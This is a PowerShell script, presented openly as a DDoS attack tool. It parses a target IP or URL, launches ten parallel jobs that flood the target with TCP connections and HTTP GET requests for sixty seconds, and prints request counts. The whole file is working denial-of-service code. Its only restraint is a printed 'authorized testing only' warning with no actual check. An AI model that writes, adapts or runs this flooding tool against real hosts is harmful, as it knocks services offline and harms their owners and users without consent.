# DDoS Attack Script (Windows) - Multi-threaded
# Usage: .\ddos_attack.ps1 TARGET
# Target can be IP:PORT, http://IP:PORT, or just IP (defaults to port 80)

param(
    [Parameter(Mandatory=$true)]
    [string]$Target
)

# Parse target - handle IP:PORT format
if ($Target -match '^(.+):(\d+)$') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+):(\d+)') {
    $TargetIP = $matches[1]
    $Port = [int]$matches[2]
} elseif ($Target -match '^https?://(.+)') {
    $TargetIP = $matches[1]
    $Port = 80
} else {
    $TargetIP = $Target
    $Port = 80
}

# Default parameters
$Threads = 10
$Duration = 60

Write-Host "Starting DDoS Attack on ${TargetIP}:${Port}" -ForegroundColor Yellow
Write-Host "Threads: $Threads | Duration: $Duration seconds" -ForegroundColor Cyan
Write-Host "WARNING: This is for authorized testing only!" -ForegroundColor Red

$endTime = (Get-Date).AddSeconds($Duration)

# Worker function
$workerScript = {
    param($targetIP, $port, $endTime)
    
    $localCount = 0
    
    while ((Get-Date) -lt $endTime) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.ReceiveTimeout = 1000
            $tcpClient.SendTimeout = 1000
            
            $tcpClient.Connect($targetIP, $port)
            $stream = $tcpClient.GetStream()
            
            $request = "GET / HTTP/1.1`r`nHost: ${targetIP}`r`nConnection: close`r`n`r`n"
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($request)
            $stream.Write($bytes, 0, $bytes.Length)
            
            $tcpClient.Close()
            $localCount++
        } catch {
            # Ignore connection errors
        }
        
        Start-Sleep -Milliseconds 50
    }
    
    return $localCount
}

# Start worker threads
$jobs = @()
for ($i = 0; $i -lt $Threads; $i++) {
    $job = Start-Job -ScriptBlock $workerScript -ArgumentList $TargetIP, $Port, $endTime
    $jobs += $job
}

Write-Host "`n$Threads worker threads started. Running for $Duration seconds..." -ForegroundColor Green

# Wait for all jobs to complete
$jobs | Wait-Job | Out-Null

# Collect results
$totalRequests = ($jobs | Receive-Job | Measure-Object -Sum).Sum
$jobs | Remove-Job

Write-Host "`nDDoS Attack completed!" -ForegroundColor Green
Write-Host "Total requests sent: $totalRequests" -ForegroundColor Cyan
Write-Host "Average requests per thread: $([math]::Round($totalRequests / $Threads, 2))" -ForegroundColor Cyan

exit 0
